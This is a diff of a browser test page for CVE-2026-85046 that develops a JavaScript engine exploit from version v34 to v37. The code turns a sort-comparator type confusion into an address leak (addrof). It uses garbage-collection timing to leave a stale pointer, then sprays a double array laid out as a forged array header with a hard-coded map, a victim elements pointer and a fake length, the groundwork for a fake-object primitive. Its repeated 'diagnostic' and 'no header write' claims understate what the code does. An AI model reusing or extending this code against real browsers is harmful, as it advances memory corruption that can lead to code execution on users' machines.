@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>CVE-2026-85046 bounded GC-cycle oracle v34</title>
+  <title>CVE-2026-85046 single-maximum reclaim v37</title>
   <style>
     :root { color-scheme: dark; font-family: ui-monospace, SFMono-Regular, Consolas, monospace; }
     body { margin: 0; padding: 24px; background: #09110e; color: #d9ffe7; }
@@ -16,16 +16,19 @@
 </head>
 <body>
 <main>
-  <h1>CVE-2026-85046 — bounded GC-cycle oracle v34</h1>
+  <h1>CVE-2026-85046 — single-maximum reclaim v37</h1>
   <p>
-    This diagnostic ages the receiver/backing store, creates one fresh target and
-    the missing-barrier stale slot, then applies small allocation chunks across
-    separate tasks. It records the first chunk where the target moves and the
-    chunks where two later weak controls finalize. The stale slot is decoded only
-    as a number. It never dereferences the stale slot and performs no fake-header,
-    arbitrary-memory, native-code, sandbox-escape, file, or network operation.
+    This one-shot diagnostic uses the GC window measured by v34. It first ages
+    the vulnerable receiver, verifies that a fresh-page maximum regular
+    FixedDoubleArray could cover the complete stale 16-byte header, and arms two
+    post-move weak controls. Once both controls finalize, the next task retains
+    exactly one 0x3fff-double payload and immediately performs one stale
+    length-marker check. If that check returns, a post-check address observation
+    reports the actual payload range. It performs no header write, arbitrary
+    memory expansion, native-code execution, sandbox escape, file, or network
+    operation.
   </p>
-  <button id="run">Run bounded oracle</button>
+  <button id="run">Run one-shot bounded probe</button>
   <pre id="output"></pre>
 </main>
 <script>
@@ -38,7 +41,22 @@ var CONFIG = Object.freeze({
   allocationsPerChunk: 64,
   allocationLength: 0x400,
   approximateKiBPerChunk: 512,
+  pageBytes: 0x40000,
+  freshPageDataOffset: 0x18,
+  payloadLength: 0x3fff,
+  fixedDoubleArrayBytes: 0x20000,
+  payloadDataBytes: 0x1fff8,
+  marker: 37,
 });
+
+var STORAGE_ATTEMPT = "f022-v37-attempt";
+var STORAGE_LAST = "f022-v37-last";
+var IS_LINUX_STOCK = /Linux/.test(navigator.platform || "") &&
+  !/Windows NT/.test(navigator.userAgent || "");
+var PACKED_DOUBLE_MAP = IS_LINUX_STOCK ? 0x01032a35 : 0x01032a81;
+var EMPTY_PROPERTIES = 0x000007e5;
+var convF64 = new Float64Array(1);
+var convU32 = new Uint32Array(convF64.buffer);
 
 var state = {
   running: false,
@@ -46,35 +64,43 @@ var state = {
   bad: null,
   targetWeak: null,
   beforeAddress: 0,
+  pageOffset: 0,
+  predictedDataStart: 0,
+  predictedResidue: -1,
+  geometryCovered: false,
+  selectedPhase: -1,
+  victim: null,
+  victimBase: 0,
+  victimElementsTagged: 0,
+  patternEven: 0,
+  patternOdd: 0,
+  payloadAllocator: null,
+  retainedPayload: null,
+  typeConfusionObserved: false,
+  addrofObserved: false,
   chunkIndex: 0,
   moveChunk: null,
   moveAddress: 0,
-  targetClearedChunk: null,
   controlAWeak: null,
   controlBWeak: null,
   controlACreatedChunk: null,
   controlBCreatedChunk: null,
   controlAFinalizedChunk: null,
   controlBFinalizedChunk: null,
-  finalizationEvents: [],
-  staleSamples: [],
+  oracleTimer: null,
+  criticalScheduled: false,
 };
 
 var registry = typeof FinalizationRegistry === "function"
   ? new FinalizationRegistry(function (holding) {
-      var event = {
-        role: holding.role,
-        runId: holding.runId,
-        createdChunk: holding.createdChunk,
-        observedFinalizedChunk: state.chunkIndex,
-      };
-      state.finalizationEvents.push(event);
+      if (holding.runId !== state.runId) return;
       if (holding.role === "post-move-control-a" && state.controlAFinalizedChunk === null) {
         state.controlAFinalizedChunk = state.chunkIndex;
       }
       if (holding.role === "post-move-control-b" && state.controlBFinalizedChunk === null) {
         state.controlBFinalizedChunk = state.chunkIndex;
       }
+      scheduleCriticalIfReady();
     })
   : null;
 
@@ -84,15 +110,29 @@ function log(message) {
   if (window.console) console.log(message);
 }
 
-function hex(value) {
-  return "0x" + (value >>> 0).toString(16);
+function hex(value) { return "0x" + (value >>> 0).toString(16); }
+
+function w2f(lo, hi) {
+  convU32[0] = lo >>> 0;
+  convU32[1] = hi >>> 0;
+  return convF64[0];
 }
 
+function persist(key, value) {
+  try { localStorage.setItem(key, JSON.stringify(value)); } catch (_) {}
+}
+
+function resetV37OneShot() {
+  try {
+    localStorage.removeItem(STORAGE_ATTEMPT);
+    localStorage.removeItem(STORAGE_LAST);
+  } catch (_) {}
+  log("[v37] persistence reset. Use only after opening a genuinely fresh renderer.");
+}
+window.resetV37OneShot = resetV37OneShot;
+
 function confuse(array) {
-  function compare() {
-    array.fill(0);
-    return 0;
-  }
+  function compare() { array.fill(0); return 0; }
   array.sort(compare);
 }
 
@@ -114,14 +154,46 @@ function addrofLeak(target) {
   var array = [target, target];
   confuse(array);
   var leaked = Number(String(array).split(",")[0]);
-  if (!Number.isInteger(leaked)) return 0;
-  return (leaked * 2) >>> 0;
+  return Number.isInteger(leaked) ? (leaked * 2) >>> 0 : 0;
 }
 
 function allocationChunk() {
   for (var i = 0; i < CONFIG.allocationsPerChunk; i++) {
     new Array(CONFIG.allocationLength).fill(1.1);
   }
+}
+
+// Separate exact sites let both possible rotations be primed before the stale
+// target exists. The critical task reuses one of these sites without an
+// elements-kind transition or a second payload allocation.
+function allocatePhase0Payload() {
+  var payload = new Array(CONFIG.payloadLength).fill(state.patternEven);
+  for (var i = 1; i < payload.length; i += 2) payload[i] = state.patternOdd;
+  return payload;
+}
+
+function allocatePhase4Payload() {
+  var payload = new Array(CONFIG.payloadLength).fill(state.patternEven);
+  for (var i = 1; i < payload.length; i += 2) payload[i] = state.patternOdd;
+  return payload;
+}
+
+function primeExactPayloadSites() {
+  var savedEven = state.patternEven;
+  var savedOdd = state.patternOdd;
+  state.patternEven = w2f(PACKED_DOUBLE_MAP, EMPTY_PROPERTIES);
+  state.patternOdd = w2f(0x00001001, CONFIG.marker << 1);
+  var phase0 = allocatePhase0Payload();
+  var sink = phase0.length;
+  phase0 = null;
+  state.patternEven = w2f(EMPTY_PROPERTIES, 0x00001001);
+  state.patternOdd = w2f(CONFIG.marker << 1, PACKED_DOUBLE_MAP);
+  var phase4 = allocatePhase4Payload();
+  sink += phase4.length;
+  phase4 = null;
+  state.patternEven = savedEven;
+  state.patternOdd = savedOdd;
+  return sink;
 }
 
 function readNumericStaleSlot() {
@@ -134,59 +206,84 @@ function readNumericStaleSlot() {
     numeric = Number.isInteger(raw);
     if (numeric) staleSlot = (raw * 2) >>> 0;
   } catch (_) {}
-  return { numeric: numeric, address: staleSlot, slotString: slotString };
+  return { numeric: numeric, address: staleSlot };
 }
 
-function publish(outcome) {
-  var stale = readNumericStaleSlot();
-  var result = {
+function geometryFor(address) {
+  var pageOffset = address & (CONFIG.pageBytes - 1);
+  var covered = pageOffset >= CONFIG.freshPageDataOffset &&
+    pageOffset + 16 <= CONFIG.freshPageDataOffset + CONFIG.payloadDataBytes;
+  var residue = covered
+    ? (pageOffset - CONFIG.freshPageDataOffset) & 0xf
+    : -1;
+  var phase = residue === 0 ? 0 : (residue === 12 ? 4 : -1);
+  return {
+    pageOffset: pageOffset,
+    covered: covered,
+    residue: residue,
+    phase: phase,
+  };
+}
+
+function baseResult(outcome) {
+  return {
     outcome: outcome,
-    typeConfusion: true,
+    typeConfusion: state.typeConfusionObserved,
+    addrof: state.addrofObserved,
     runId: state.runId,
-    config: CONFIG,
-    beforeAddress: hex(state.beforeAddress),
+    platformProfile: IS_LINUX_STOCK ? "linux-stock" : "windows-canva",
+    packedDoubleMap: hex(PACKED_DOUBLE_MAP),
+    beforeAddress: state.beforeAddress ? hex(state.beforeAddress) : null,
+    pageOffset: hex(state.pageOffset),
+    assumedFreshPageDataOffset: hex(CONFIG.freshPageDataOffset),
+    predictedFullHeaderCovered: state.geometryCovered,
+    predictedResidue: state.predictedResidue,
+    selectedPhase: state.selectedPhase,
+    marker: CONFIG.marker,
     moveChunk: state.moveChunk,
     moveAddress: state.moveAddress ? hex(state.moveAddress) : null,
-    targetClearedChunk: state.targetClearedChunk,
-    finalChunk: state.chunkIndex,
-    staleSlotAfter: stale.numeric ? hex(stale.address) : null,
-    staleSlotNumeric: stale.numeric,
-    staleSlotStillOriginal: stale.numeric && stale.address === state.beforeAddress,
     controlA: {
       createdChunk: state.controlACreatedChunk,
       finalizedChunk: state.controlAFinalizedChunk,
-      chunksToFinalize: state.controlAFinalizedChunk === null
-        ? null : state.controlAFinalizedChunk - state.controlACreatedChunk,
     },
     controlB: {
       createdChunk: state.controlBCreatedChunk,
       finalizedChunk: state.controlBFinalizedChunk,
-      chunksToFinalize: state.controlBFinalizedChunk === null
-        ? null : state.controlBFinalizedChunk - state.controlBCreatedChunk,
     },
-    finalizationEvents: state.finalizationEvents,
-    staleSamples: state.staleSamples,
-    staleSlotDereferenceAttempted: false,
-    staleSlotNumericStringLeakAttempted: true,
-    fakeHeaderAttempted: false,
+    allocationGeometry: {
+      count: 1,
+      javascriptLength: CONFIG.payloadLength,
+      fixedDoubleArrayBytes: CONFIG.fixedDoubleArrayBytes,
+      payloadDataBytes: CONFIG.payloadDataBytes,
+    },
+    bad2LengthChecks: 0,
+    headerWriteAttempted: false,
     arbitraryMemoryAccessAttempted: false,
     nativeCodeExecutionAttempted: false,
     sandboxEscapeAttempted: false,
     externalNetworkUsed: false,
   };
-  window.probeResult = result;
-  // Drop every diagnostic heap reference before formatting the final result.
-  // The published object contains primitives only; no stale-bearing JSArray or
-  // WeakRef remains live while the harness reads the answer.
+}
+
+function releaseFragileReferences() {
   state.bad = null;
   state.targetWeak = null;
   state.controlAWeak = null;
   state.controlBWeak = null;
-  try { localStorage.setItem("f022-v34-last", JSON.stringify(result)); } catch (_) {}
+  state.victim = null;
+  state.retainedPayload = null;
+  state.payloadAllocator = null;
+}
+
+function publishDiagnostic(outcome) {
+  var result = baseResult(outcome);
+  window.probeResult = result;
+  releaseFragileReferences();
+  persist(STORAGE_LAST, result);
   log("\n" + JSON.stringify(result, null, 2));
   state.running = false;
   document.getElementById("run").disabled = false;
-  document.getElementById("run").textContent = "Run bounded oracle";
+  document.getElementById("run").textContent = "Run one-shot bounded probe";
 }
 
 function makeControl(role) {
@@ -200,16 +297,90 @@ function makeControl(role) {
   return weak;
 }
 
+function scheduleCriticalIfReady() {
+  if (state.criticalScheduled || state.controlAFinalizedChunk === null ||
+      state.controlBFinalizedChunk === null) return;
+  state.criticalScheduled = true;
+  if (state.oracleTimer !== null) clearTimeout(state.oracleTimer);
+  state.oracleTimer = null;
+  setTimeout(criticalSingleAllocationTask, 0);
+}
+
+function criticalSingleAllocationTask() {
+  // CRITICAL WINDOW: keep this first statement as the sole retained payload
+  // allocation. Do not add logging, stringification, persistence, addrof, or
+  // another allocation before the following single stale length read.
+  state.retainedPayload = state.payloadAllocator();
+  var observedLength = null;
+  var readReturned = false;
+  var readThrew = false;
+  var readErrorName = null;
+  try {
+    observedLength = state.bad[2].length;
+    readReturned = true;
+  } catch (error) {
+    readThrew = true;
+    readErrorName = error && error.name ? error.name : "Error";
+  }
+
+  // The only stale-object property read has returned. Address observation and
+  // result formatting are deliberately post-check diagnostics.
+  var markerLanded = observedLength === CONFIG.marker;
+  var payloadAddress = addrofLeak(state.retainedPayload);
+  var actualDataStart = (payloadAddress - CONFIG.fixedDoubleArrayBytes + 8) >>> 0;
+  var actualDistance = (state.beforeAddress - actualDataStart) >>> 0;
+  var actualCovered = actualDistance + 16 <= CONFIG.payloadDataBytes;
+  var actualResidue = actualDistance & 0xf;
+  var actualPhaseRequired = actualResidue === 0 ? 0 :
+    (actualResidue === 12 ? 4 : -1);
+  var stale = readNumericStaleSlot();
+
+  var result = baseResult(markerLanded
+    ? "v37-single-maximum-marker-landed"
+    : "v37-single-maximum-returned-without-marker");
+  result.observedLength = observedLength;
+  result.markerLanded = markerLanded;
+  result.bad2LengthChecks = 1;
+  result.bad2LengthReadReturned = readReturned;
+  result.bad2LengthReadThrew = readThrew;
+  result.bad2LengthReadErrorName = readErrorName;
+  result.staleSlotAfter = stale.numeric ? hex(stale.address) : null;
+  result.staleSlotStillOriginal = stale.numeric && stale.address === state.beforeAddress;
+  result.postCheckPlacement = {
+    classification: "conditional-inference-only",
+    formula: "inferredDataStart = addrof(payload) - 0x20000 + 8",
+    formulaAssumption: "non-folded maximum-regular FixedDoubleArray immediately precedes JSArray",
+    payloadJsArrayAddress: payloadAddress ? hex(payloadAddress) : null,
+    inferredDataStart: payloadAddress ? hex(actualDataStart) : null,
+    distanceFromInferredDataStart: payloadAddress ? hex(actualDistance) : null,
+    inferredFullHeaderCovered: payloadAddress ? actualCovered : false,
+    inferredResidue: payloadAddress ? actualResidue : null,
+    inferredPhaseRequired: payloadAddress ? actualPhaseRequired : null,
+    selectedPhaseMatchedInference: payloadAddress
+      ? actualPhaseRequired === state.selectedPhase
+      : false,
+    upgradesPlacementProof: false,
+  };
+
+  window.probeResult = result;
+  releaseFragileReferences();
+  persist(STORAGE_LAST, result);
+  log("\n" + JSON.stringify(result, null, 2));
+  state.running = false;
+  document.getElementById("run").disabled = false;
+  document.getElementById("run").textContent = "One-shot test complete";
+}
+
 function installStaleTarget() {
   var target = { x: 420, runId: state.runId };
   state.targetWeak = new WeakRef(target);
   state.bad[1] = target;
   confuse(state.bad);
   var parts = String(state.bad).split(",");
-  if (!looksLikeLeak(parts)) return { ok: false, observed: String(state.bad) };
+  if (!looksLikeLeak(parts)) return false;
   state.beforeAddress = (Number(parts[1]) * 2) >>> 0;
   state.bad.unshift(0);
-  return { ok: true };
+  return true;
 }
 
 function preAgeTask(index) {
@@ -218,115 +389,161 @@ function preAgeTask(index) {
     setTimeout(function () { preAgeTask(index + 1); }, 0);
     return;
   }
+
   log("[+] Receiver/backing pre-age completed: " + CONFIG.preAgeChunks + " chunks.");
-  var setup = installStaleTarget();
-  if (!setup.ok) {
-    publish("target-address-leak-not-observed");
+  log("[*] Priming both exact 0x3fff double-payload sites before stale creation.");
+  primeExactPayloadSites();
+  state.victimBase = addrofLeak(state.victim);
+  if (!state.victimBase || state.victimBase <= 0x10000 ||
+      state.victimBase >= 0xfffffff0 || (state.victimBase & 3) !== 0) {
+    publishDiagnostic("victim-addrof-not-observed-or-implausible");
     return;
   }
-  log("[+] Stale edge armed at " + hex(state.beforeAddress) + ".");
-  log("[*] Starting small-chunk GC oracle; stale slot remains numeric-only.");
-  setTimeout(oracleTask, 0);
+  state.addrofObserved = true;
+  state.victimElementsTagged = ((state.victimBase - 8) | 1) >>> 0;
+
+  if (!installStaleTarget()) {
+    publishDiagnostic("target-address-leak-not-observed");
+    return;
+  }
+
+  var geometry = geometryFor(state.beforeAddress);
+  state.pageOffset = geometry.pageOffset;
+  state.predictedDataStart =
+    ((state.beforeAddress & ~(CONFIG.pageBytes - 1)) + CONFIG.freshPageDataOffset) >>> 0;
+  state.geometryCovered = geometry.covered;
+  state.predictedResidue = geometry.residue;
+  state.selectedPhase = geometry.phase;
+
+  if (!geometry.covered || geometry.phase < 0) {
+    publishDiagnostic(!geometry.covered
+      ? "v37-geometry-gate-no-full-header-coverage"
+      : "v37-geometry-gate-unsupported-residue");
+    return;
+  }
+
+  var fakeLengthSmi = CONFIG.marker << 1;
+  if (state.selectedPhase === 0) {
+    state.patternEven = w2f(PACKED_DOUBLE_MAP, EMPTY_PROPERTIES);
+    state.patternOdd = w2f(state.victimElementsTagged, fakeLengthSmi);
+    state.payloadAllocator = allocatePhase0Payload;
+  } else {
+    state.patternEven = w2f(EMPTY_PROPERTIES, state.victimElementsTagged);
+    state.patternOdd = w2f(fakeLengthSmi, PACKED_DOUBLE_MAP);
+    state.payloadAllocator = allocatePhase4Payload;
+  }
+
+  var stale = readNumericStaleSlot();
+  var armed = baseResult("v37-armed-before-controls");
+  armed.victimBase = hex(state.victimBase);
+  armed.victimElementsTagged = hex(state.victimElementsTagged);
+  armed.predictedDataStart = hex(state.predictedDataStart);
+  armed.staleSlotBeforeOracle = stale.numeric ? hex(stale.address) : null;
+  armed.staleSlotStillOriginal = stale.numeric && stale.address === state.beforeAddress;
+  armed.criticalWillAttemptOnePayloadAndOneLengthRead = true;
+  armed.crashEvidenceBoundary =
+    "If the renderer exits after this record, allocation completion and read entry are intentionally indistinguishable; no post-allocation persistence is permitted in the critical window.";
+  persist(STORAGE_LAST, armed);
+  persist(STORAGE_ATTEMPT, {
+    status: "armed",
+    runId: state.runId,
+    beforeAddress: hex(state.beforeAddress),
+    pageOffset: hex(state.pageOffset),
+    selectedPhase: state.selectedPhase,
+  });
+
+  log("[+] Stale edge armed at " + hex(state.beforeAddress) +
+      "; pageOffset=" + hex(state.pageOffset) +
+      "; residue=" + state.predictedResidue +
+      "; phase=" + state.selectedPhase + ".");
+  log("[*] Armed metadata persisted before controls. Starting bounded GC oracle.");
+  state.oracleTimer = setTimeout(oracleTask, 0);
 }
 
 function oracleTask() {
+  if (state.criticalScheduled) return;
   state.chunkIndex++;
   allocationChunk();
 
-  // Address-observe only until the first move. Re-running the confusion-based
-  // addrof after that event is unnecessary for GC-cycle calibration and adds a
-  // second heap-confusion site. Later chunks observe only control finalization
-  // and the stale slot's numeric value.
-  var target = null;
-  var targetObserved = state.moveChunk === null;
-  var currentAddress = 0;
-  if (targetObserved) {
-    target = state.targetWeak.deref();
-    currentAddress = target === undefined ? 0 : addrofLeak(target);
-  }
-  var stale = readNumericStaleSlot();
-
-  if (state.staleSamples.length < 16 ||
-      state.chunkIndex % 16 === 0 ||
-      state.moveChunk === null) {
-    state.staleSamples.push({
-      chunk: state.chunkIndex,
-      targetAlive: targetObserved ? target !== undefined : null,
-      targetAddress: currentAddress ? hex(currentAddress) : null,
-      staleAddress: stale.numeric ? hex(stale.address) : null,
-      staleStillOriginal: stale.numeric && stale.address === state.beforeAddress,
-    });
+  if (state.moveChunk === null) {
+    var target = state.targetWeak.deref();
+    var currentAddress = target === undefined ? 0 : addrofLeak(target);
+    if (target !== undefined && currentAddress && currentAddress !== state.beforeAddress) {
+      state.moveChunk = state.chunkIndex;
+      state.moveAddress = currentAddress;
+      state.controlACreatedChunk = state.chunkIndex;
+      state.controlAWeak = makeControl("post-move-control-a");
+      log("[+] Target moved at chunk " + state.moveChunk + ": " +
+          hex(state.beforeAddress) + " -> " + hex(currentAddress) + ".");
+      state.oracleTimer = setTimeout(createSecondControlTask, 0);
+      return;
+    }
   }
 
-  if (targetObserved && target === undefined && state.targetClearedChunk === null) {
-    state.targetClearedChunk = state.chunkIndex;
-  }
-
-  if (targetObserved && target !== undefined && currentAddress && currentAddress !== state.beforeAddress && state.moveChunk === null) {
-    state.moveChunk = state.chunkIndex;
-    state.moveAddress = currentAddress;
-    state.controlACreatedChunk = state.chunkIndex;
-    state.controlAWeak = makeControl("post-move-control-a");
-    log("[+] Target first moved at chunk " + state.moveChunk + ": " +
-        hex(state.beforeAddress) + " -> " + hex(currentAddress));
-    // Control B must be born in a later JavaScript job than control A.
-    setTimeout(createSecondControlTask, 0);
-    return;
-  }
-
-  if (state.moveChunk !== null &&
-      state.controlAFinalizedChunk !== null &&
-      state.controlBFinalizedChunk !== null) {
-    publish("gc-cycle-calibrated-two-controls-finalized");
-    return;
-  }
-
+  scheduleCriticalIfReady();
+  if (state.criticalScheduled) return;
   if (state.chunkIndex >= CONFIG.maxOracleChunks) {
-    publish(state.moveChunk === null
+    publishDiagnostic(state.moveChunk === null
       ? "target-did-not-move-within-bound"
       : "controls-did-not-both-finalize-within-bound");
     return;
   }
-  setTimeout(oracleTask, 0);
+  state.oracleTimer = setTimeout(oracleTask, 0);
 }
 
 function createSecondControlTask() {
-  // Advance one real bounded allocation chunk before creating B so its birth is
-  // unambiguously later than A in both task order and chunk accounting.
+  if (state.criticalScheduled) return;
   state.chunkIndex++;
   allocationChunk();
   state.controlBCreatedChunk = state.chunkIndex;
   state.controlBWeak = makeControl("post-move-control-b");
   log("[*] Two post-move controls installed in consecutive tasks.");
-  setTimeout(oracleTask, 0);
+  scheduleCriticalIfReady();
+  if (!state.criticalScheduled) state.oracleTimer = setTimeout(oracleTask, 0);
 }
 
 function run() {
   if (state.running) return;
   state.running = true;
   state.runId++;
-  state.bad = null;
-  state.targetWeak = null;
-  state.beforeAddress = 0;
-  state.chunkIndex = 0;
-  state.moveChunk = null;
-  state.moveAddress = 0;
-  state.targetClearedChunk = null;
-  state.controlAWeak = null;
-  state.controlBWeak = null;
-  state.controlACreatedChunk = null;
-  state.controlBCreatedChunk = null;
-  state.controlAFinalizedChunk = null;
-  state.controlBFinalizedChunk = null;
-  state.finalizationEvents = [];
-  state.staleSamples = [];
   document.getElementById("output").textContent = "";
   document.getElementById("run").disabled = true;
-  document.getElementById("run").textContent = "Running...";
+  document.getElementById("run").textContent = "Running one-shot test...";
+
+  var previousAttempt = null;
+  var previousLast = null;
+  try {
+    previousAttempt = localStorage.getItem(STORAGE_ATTEMPT);
+    previousLast = localStorage.getItem(STORAGE_LAST);
+  } catch (_) {}
+  if (previousLast) log("[previous v37 record] " + previousLast);
+  if (previousAttempt) {
+    var stopped = {
+      outcome: "v37-one-test-per-fresh-renderer-gate",
+      previousAttempt: previousAttempt,
+      instruction: "Open a genuinely fresh renderer before resetting v37 persistence.",
+      bad2LengthChecks: 0,
+      nativeCodeExecutionAttempted: false,
+      sandboxEscapeAttempted: false,
+    };
+    window.probeResult = stopped;
+    log(JSON.stringify(stopped, null, 2));
+    state.running = false;
+    document.getElementById("run").disabled = false;
+    document.getElementById("run").textContent = "Fresh renderer required";
+    return;
+  }
+
+  // Claim this origin/renderer before any heap work. Even a geometry-gated or
+  // interrupted attempt must not silently rerun in the same renderer.
+  persist(STORAGE_ATTEMPT, {
+    status: "started",
+    runId: state.runId,
+    startedAt: Date.now(),
+  });
 
   if (typeof WeakRef !== "function" || !registry) {
-    window.probeResult = { outcome: "weak-reference-apis-unavailable" };
-    publish("weak-reference-apis-unavailable");
+    publishDiagnostic("weak-reference-apis-unavailable");
     return;
   }
 
@@ -342,12 +559,13 @@ function run() {
     parts = String(demo).split(",");
   }
   if (!looksLikeLeak(parts)) {
-    state.beforeAddress = 0;
-    publish("type-confusion-not-observed");
+    publishDiagnostic("type-confusion-not-observed");
     return;
   }
 
   log("[+] Type confusion observed.");
+  state.typeConfusionObserved = true;
+  state.victim = [1.22, 1.33, 1.44];
   state.bad = [{ seed: 1 }, { seed: 2 }, 69];
   state.bad.pop();
   log("[*] Explicitly aging receiver/backing using bounded 512 KiB chunks...");
